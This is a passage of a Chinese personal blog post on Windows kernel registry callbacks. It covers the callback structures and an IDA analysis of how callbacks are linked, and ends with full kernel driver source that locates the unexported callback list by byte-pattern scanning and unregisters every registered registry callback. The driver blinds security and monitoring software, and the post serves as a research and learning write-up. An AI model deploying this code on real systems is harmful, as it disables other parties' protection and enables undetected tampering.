<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">REG_DELETE_KEY_INFORMATION</span> &#123;</span></span><br><span class="line">    PVOID    Object;                      <span class="comment">// IN</span></span><br><span class="line">    PVOID    CallContext;  </span><br><span class="line">    PVOID    ObjectContext;</span><br><span class="line">    PVOID    Reserved;     </span><br><span class="line">&#125; REG_DELETE_KEY_INFORMATION, *PREG_DELETE_KEY_INFORMATION</span><br></pre></td></tr></table></figure>

<p>然后<code>PREG_DELETE_VALUE_KEY_INFORMATION</code>结构体定义如下,<code>Object</code>还是指向要删除的注册表的指针，而<code>ValueName</code>就是指向具体需要删除的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">REG_DELETE_VALUE_KEY_INFORMATION</span> &#123;</span></span><br><span class="line">  PVOID           Object;</span><br><span class="line">  PUNICODE_STRING ValueName;</span><br><span class="line">  PVOID           CallContext;</span><br><span class="line">  PVOID           ObjectContext;</span><br><span class="line">  PVOID           Reserved;</span><br><span class="line">&#125; REG_DELETE_VALUE_KEY_INFORMATION, *PREG_DELETE_VALUE_KEY_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>最后是<code>PREG_SET_VALUE_KEY_INFORMATION</code>结构，同样是<code>Object</code>指向要修改的注册表的指针，而<code>ValueName</code>就是指向具体需要修改的值。</p>
<h3 id="IDA逆向分析"><a href="#IDA逆向分析" class="headerlink" title="IDA逆向分析"></a>IDA逆向分析</h3><p>这个函数首先将需要的参数入栈以后调用<code>CmpRegisterCallbackInternal</code></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220630164456292.png" alt="image-20220630164456292"></p>
<p>通过<code>test esi,esi</code>将<code>Blink</code>和<code>Flink</code>都指向自己，然后进行判断后跳转到<code>69436B</code>这个地址</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220630164913636.png" alt="image-20220630164913636"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220630165633538.png" alt="image-20220630165633538"></p>
<p>这段函数的主要作用就是将<code>Cookie</code>的值存入<code>0x10</code>偏移处，这里的设计很巧妙，因为一个cookie是占8位的，这里首先将<code>[esi + 0x10]</code>的值存入eax，然后将 ebx 指向的内存位置的内容移动到指向 eax 的内存位置，相当于赋值前4位，然后再进行同样的操作，这里取的是<code>[esi + 0x14]</code>，也就是赋值后四位。</p>
<p><img src="C:\Users\16434\AppData\Roaming\Typora\typora-user-images\image-20220630171826957.png" alt="image-20220630171826957"></p>
<p>可以看到，系统分配0x30大小的内存来保存相应的内容，根据以上的分析可以得出下面的结论</p>
<ul>
<li>最开始的8个字节保存的是一个<code>LIST_ENTRY</code>类型的双向链表</li>
<li>偏移0x10保存的是COOKIE</li>
<li>偏移0x1C保存的Context</li>
<li>偏移0x18保存的是回调函数的地址</li>
</ul>
<p>可以想到注册表监控的回调函数是用<code>LIST_ENTRY</code>双向链表来一个个连起来的。而真正将分配的这块内存加入链表的函数则是<code>SetRegisterCallback</code>函数</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220630173058237.png" alt="image-20220630173058237"></p>
<p>在这个<code>ListBegin</code>就是链表头的地址，里面保存的就是第一个链表的地址。首先会将它保存的内容取出判断保存的是否就是<code>ListBegin</code>的首地址，如果是的话就说明到了链表的尾部，接下来就会跳转到<code>loc_695306</code>来把结构加进链表。如果不是的话，它会执行循环，不断的取链表中的下一个数据直到链表尾。</p>
<p>​           ——————————————-我是一条分割线—————————————————————</p>
<p>根据上面的内容知道了，回调函数是可以获取要操作的注册表键的对象的，所以可以使用<code>ObQueryNameString</code>函数来<strong>获得要操作的键的名称</strong>，该函数在文档中的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">ObQueryNameString</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID  Object,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT POBJECT_NAME_INFORMATION  ObjectNameInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG  Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PULONG  ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Object</td>
<td>指向请求名称的对象的指针。此参数是必需的，不能为NULL。</td>
</tr>
<tr>
<td>ObjectNameInfo</td>
<td>指向接收对象名称信息的调用方分配的缓冲区的OBJECT_NAME_INFORMATION指针</td>
</tr>
<tr>
<td>Length</td>
<td>参数二的缓冲区大小</td>
</tr>
<tr>
<td>ReturnLength</td>
<td>实际返回到缓冲区中的数据大小</td>
</tr>
</tbody></table>
<p><strong>想要实现对监控函数的删除，</strong>可以使用<code>CmUnRegisterCallback</code>函数来实现，该函数在文档中的定义如下。它只有一个参数，就是前面设置监控函数时候指定的<code>Cookie</code>的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">CmUnRegisterCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN LARGE_INTEGER  Cookie)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="实施监控"><a href="#实施监控" class="headerlink" title="实施监控"></a>实施监控</h3><p>注册表的监控回调函数被以链表的形式保存到了内存中，其中这个链表头是ListBegin。接下来只要找到这个链表头并且遍历这个链表，取出COOKIE就可以实现回调函数的删除。通过字节码匹配可以找到链表头。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT driverObject)</span></span>;</span><br><span class="line"><span class="function">PULONG <span class="title">GetRegisterList</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    PULONG pHead = <span class="literal">NULL</span>;</span><br><span class="line">    PLIST_ENTRY pListEntry = <span class="literal">NULL</span>;</span><br><span class="line">    PLARGE_INTEGER  pLiRegCookie = <span class="literal">NULL</span>;</span><br><span class="line">    LARGE_INTEGER test;</span><br><span class="line">    PULONG pFuncAddr = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    DbgPrint(<span class="string">&quot;驱动加载完成\r\n&quot;</span>);</span><br><span class="line">    pHead = GetRegisterList();</span><br><span class="line">    <span class="keyword">if</span> (pHead != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pListEntry = (PLIST_ENTRY)*pHead;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">while</span> ((ULONG)pListEntry != (ULONG)pHead)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!MmIsAddressValid(pListEntry)) <span class="keyword">break</span>;</span><br><span class="line">             </span><br><span class="line">            pLiRegCookie = (PLARGE_INTEGER)((ULONG)pListEntry + <span class="number">0x10</span>);</span><br><span class="line">            pFuncAddr = (PULONG)((ULONG)pListEntry + <span class="number">0x1C</span>);</span><br><span class="line">            <span class="comment">//判断地址是否有效</span></span><br><span class="line">            <span class="keyword">if</span> (MmIsAddressValid(pFuncAddr) &amp;&amp;  MmIsAddressValid(pLiRegCookie))</span><br><span class="line">            &#123;</span><br><span class="line">                status = CmUnRegisterCallback(*pLiRegCookie);</span><br><span class="line">                <span class="keyword">if</span> (NT_SUCCESS(status))</span><br><span class="line">                &#123;</span><br><span class="line">                    DbgPrint(<span class="string">&quot;删除注册表回调成功,函数地址为0x%X\r\n&quot;</span>, *pFuncAddr);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            pListEntry = pListEntry-&gt;Flink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">    driverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function">PULONG <span class="title">GetRegisterList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PULONG pListEntry = <span class="literal">NULL</span>;</span><br><span class="line">    PUCHAR pCmRegFunc = <span class="literal">NULL</span>, pCmcRegFunc = <span class="literal">NULL</span>, pSetRegFunc = <span class="literal">NULL</span>;</span><br><span class="line">    UNICODE_STRING uStrFuncName = RTL_CONSTANT_STRING(<span class="string">L&quot;CmRegisterCallback&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    pCmRegFunc = (PUCHAR)MmGetSystemRoutineAddress(&amp;uStrFuncName);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (pCmRegFunc == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;MmGetSystemRoutineAddress Error\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">while</span> (*pCmRegFunc != <span class="number">0xC2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*pCmRegFunc == <span class="number">0xE8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pCmcRegFunc = (PUCHAR)((ULONG)pCmRegFunc + <span class="number">5</span> + *(PULONG)(pCmRegFunc + <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pCmRegFunc++;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (pCmcRegFunc == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;GetCmcRegFunc Error\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (*pCmcRegFunc != <span class="number">0xC2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*pCmcRegFunc == <span class="number">0x8B</span> &amp;&amp; *(pCmcRegFunc +<span class="number">1</span>) == <span class="number">0xC6</span> &amp;&amp; *(pCmcRegFunc + <span class="number">2</span>) == <span class="number">0xE8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pSetRegFunc = (PUCHAR)((ULONG)pCmcRegFunc + <span class="number">2</span> + <span class="number">5</span> + *(PULONG)(pCmcRegFunc + <span class="number">3</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pCmcRegFunc++;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (pSetRegFunc == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;GetSetRegFunc Error\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (*pSetRegFunc != <span class="number">0xC2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*pSetRegFunc == <span class="number">0xBB</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pListEntry = (PULONG)*(PULONG)(pSetRegFunc + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pSetRegFunc++;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">    <span class="keyword">return</span> pListEntry;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT driverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;驱动卸载完成\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269980.htm#msg_header_h1_0">看雪</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mefFuWKJMDJMYvNTjzBVuw">跳跳糖</a></p>
<p>(<strong>PS</strong>:前面虽然说是64位，但是我发现参考的文章其实IDA分析的都是32位的ntoskrnl.exe)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZouFeIYu"
      src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
  <p class="site-author-name" itemprop="name">ZouFeIYu</p>
  <div class="site-description" itemprop="description">reading, coding, travelling</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">110</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">118</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/erkeai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;erkeai" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:563783592@qq.com" title="E-Mail → mailto:563783592@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-feather"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZouFeIYu</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">281k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">4:16</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
